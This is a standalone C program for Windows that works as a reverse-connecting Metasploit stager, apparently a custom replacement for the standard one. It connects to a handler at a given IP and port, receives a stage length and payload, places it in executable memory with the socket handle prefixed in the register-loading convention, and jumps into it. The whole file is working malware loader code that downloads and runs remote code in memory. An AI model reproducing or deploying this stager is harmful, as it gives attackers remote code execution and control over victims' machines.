#include <winsock2.h>
#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib") // Better here than linker settings...

int main(int argc, char *argv[])
{
	char *IP = argv[1];
	char *iPort = argv[2];
	int len;
	char* buff;
	int count = 0;
	WSADATA wsaData;
	SOCKET SocketToHandler = INVALID_SOCKET;
	
	struct sockaddr_in handler;
	handler.sin_addr.S_un.S_addr = inet_addr(argv[1]);
	handler.sin_family = AF_INET;
	handler.sin_port = htons(atoi(argv[2]));

	int iResult;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		printf("WSAStartup failed: %d\n", iResult);
		WSACleanup();
		exit(1);
	}
		
	// Create a SOCKET for connecting to server
	SocketToHandler = socket(AF_INET, SOCK_STREAM, NULL);
	if (SocketToHandler == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		exit(1);
	}

	// Connect to handler
	iResult = connect(SocketToHandler,(sockaddr *)&handler, sizeof(handler));
	if (iResult == SOCKET_ERROR) {
		printf("[-] Failed to connect ... will exit!\n");
		closesocket(SocketToHandler);
		exit(1);
	}

	printf("[+] Socket: %d\n", SocketToHandler);

	printf("[*] Connecting \"%s:%s\"\n", IP, iPort);

	count = recv(SocketToHandler, (char*)&len, 4, NULL); //read 4 bytes ... the first 4 bytes sent over from the handler are size of stage
	if (count != 4 || len <= 0)
	{
		printf("[-] We connected, but something went wrong while receiving stage size ... will exit!\n");
		exit(1);
	}

	printf("[*] Stage length = \"%d\" bytes.\n", len);
	buff = (char*)VirtualAlloc(0, len + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); //allocate
	if (buff == NULL)
	{
		printf("[-] Failed to allocate memory! VirtualAlloc() returned : %08x\n", GetLastError());
		exit(1);
	}

	printf("[*] Success! \"%d\" bytes allocated.\n", (len + 5));
	// Getting the stage
	recv(SocketToHandler, buff + 5, len, MSG_WAITALL); // not specifying MSG_WAITALL caused me two days of headache ...
	printf("[*] Setting EDI-to-be value:  0x%08x -> 0xBF\n", &buff);
	buff[0] = (char)0xBF;
	printf("[*] Copying the socket address to the next 4 bytes...\n");
	memcpy(buff + 1, &SocketToHandler, 4);
	printf("[*] Detaching from console & calling the function, bye bye [ultimet], hello metasploit!\n");
	(*(void(*)())buff)();//Bye bye ...
}
